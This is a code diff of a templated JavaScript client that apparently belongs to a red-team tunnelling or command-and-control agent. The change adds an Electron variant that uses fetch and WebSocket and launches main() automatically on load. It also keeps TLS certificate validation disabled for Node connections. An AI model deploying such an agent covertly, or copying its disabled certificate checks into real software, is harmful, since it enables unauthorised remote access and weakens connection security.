@@ -1,6 +1,7 @@
 const crypto = require('crypto');
 const assert = require('assert');
 const net = require('net');
+{% if not electron %}
 const http = require('http');
 const https = require('https');
 
@@ -11,6 +12,7 @@ try {
 } catch {
   console.warn('[!] Failed to import "ws" module — WebSocket support disabled.');
 }
+{% endif %}
 /* AES */
 
 function encrypt(key, plaintext) {
@@ -320,47 +322,60 @@ class WSClient extends Client {
     super(encryptionKey, userAgent);
     this.serverUrl = serverUrl.replace(/^\/+|\/+$/g, '') + '/socketio/?EIO=4&transport=websocket';
     this.ws = null;
+{% if not electron %}
     this.wsOptions = {
       headers: this.headers,
       rejectUnauthorized: false
     };
+{% endif %}
   }
 
   async connect(){
+{% if not electron %}
     this.ws = new WebSocket(this.serverUrl, this.wsOptions);
+{% else %}
+    this.ws = new WebSocket(this.serverUrl);
+{% endif %}
+    this.ws.binaryType = 'arraybuffer';
 
     await new Promise((resolve, reject) => {
-      this.ws.once('open', resolve);
-      this.ws.once('error', reject);
+      this.ws.addEventListener('open', resolve, { once: true });
+      this.ws.addEventListener('error',
+        (e) => reject(e.error || new Error(e.message || 'Connection failed')),
+        { once: true }
+      );
     });
 
     const checkIn = this.serializeMessages([CheckInMessage(this.identifier)]);
     this.ws.send(checkIn);
 
-    if (this.identifier) {
-      return;
-    }
+    if (this.identifier) return;
 
     const msg = await new Promise((res, rej) => {
-      this.ws.once('message', data => res(Buffer.from(data)));
-      this.ws.once('error', rej);
+      this.ws.addEventListener('message',
+        (e) => res(Buffer.from(e.data)),
+        { once: true }
+      );
+      this.ws.addEventListener('error',
+        (e) => rej(e.error || new Error(e.message || 'Connection failed')),
+        { once: true }
+      );
     });
     const messages = this.deserializeMessages(msg);
-    assert (messages.length > 0, `[!] Invalid response from server ${messages}`);
+    assert(messages.length > 0, `[!] Invalid response from server ${messages}`);
     const checkInMessage = messages[0];
     assert.strictEqual(checkInMessage.kind, 'CheckInMessage', `[!] Invalid response from server: ${messages}`);
     this.identifier = checkInMessage.messenger_id;
   }
 
   async start() {
-    // flush queued downstream
     while (this.downstream_messages.length > 0) {
       const msg = this.downstream_messages.shift();
       this.sendDownstreamMessage(msg);
     }
 
-    this.ws.on('message', async (data) => {
-      const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
+    this.ws.addEventListener('message', async (e) => {
+      const buf = Buffer.from(e.data);
       const messages = this.deserializeMessages(buf);
       for (const msg of messages) {
         await this.handleMessage(msg);
@@ -368,14 +383,14 @@ class WSClient extends Client {
     });
 
     return new Promise((resolve, reject) => {
-      this.ws.once('close', (code, reason) => {
-        console.log(`[*] Websocket Closed: code=${code}, reason=${reason ? reason.toString('utf8') : ''}`);
-        resolve({ code, reason });
-      });
+      this.ws.addEventListener('close', (e) => {
+        console.log(`[*] Websocket Closed: code=${e.code}, reason=${e.reason || ''}`);
+        resolve({ code: e.code, reason: e.reason });
+      }, { once: true });
 
-      this.ws.once('error', (err) => {
-        reject(err);
-      });
+      this.ws.addEventListener('error', (e) => {
+        reject(e.error || new Error(e.message || 'WebSocket error'));
+      }, { once: true });
     });
   }
 
@@ -400,11 +415,33 @@ class HTTPClient extends Client {
   }
 
   async _postBinary(url, bodyBytes, timeoutMs = this._timeoutMs) {
+{% if electron %}
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), timeoutMs);
+    try {
+      const resp = await fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/octet-stream',
+          'Accept': 'application/octet-stream',
+        },
+        body: bodyBytes,
+        signal: controller.signal,
+      });
+      clearTimeout(timer);
+      if (!resp.ok) throw new Error(`HTTP ${resp.status} ${resp.statusText}`);
+      return Buffer.from(await resp.arrayBuffer());
+    } catch (e) {
+      clearTimeout(timer);
+      if (e.name === 'AbortError') throw new Error('Request timed out');
+      throw e;
+    }
+{% else %}
     const u = new URL(url);
     const isHttps = u.protocol === 'https:';
 
     const agent = isHttps
-      ? new https.Agent({ rejectUnauthorized: false }) // accept self-signed certs (scoped to this client)
+      ? new https.Agent({ rejectUnauthorized: false })
       : new http.Agent();
 
     const options = {
@@ -424,7 +461,6 @@ class HTTPClient extends Client {
     return new Promise((resolve, reject) => {
       const req = (isHttps ? https : http).request(options, (res) => {
         if (res.statusCode < 200 || res.statusCode >= 300) {
-          // drain and error
           res.resume();
           return reject(new Error(`HTTP ${res.statusCode} ${res.statusMessage}`));
         }
@@ -437,6 +473,7 @@ class HTTPClient extends Client {
       req.on('error', reject);
       req.end(bodyBytes);
     });
+{% endif %}
   }
 
   async connect() {
@@ -674,7 +711,11 @@ async function main() {
   for (const attempt of attempts) {
     const candidateUrl = `${attempt}://${remainder}/`;
     try {
+{% if not electron %}
       if (attempt.includes('ws') && wsImported) {
+{% else %}
+      if (attempt.includes('ws')) {
+{% endif %}
         console.log(`[*] Attempting to connect over ${attempt.toUpperCase()}`);
         client = new WSClient(candidateUrl, encryptionKey, userAgent);
       } else if (attempt.includes('http')) {
@@ -746,6 +787,10 @@ const DEFAULTS = {
   RETRY_DURATION: {{ retry_duration }},
 };
 
+{% if not electron %}
 if (require.main === module) {
   main().catch(console.error);
 }
+{% else %}
+main().catch(console.error);
+{% endif %}
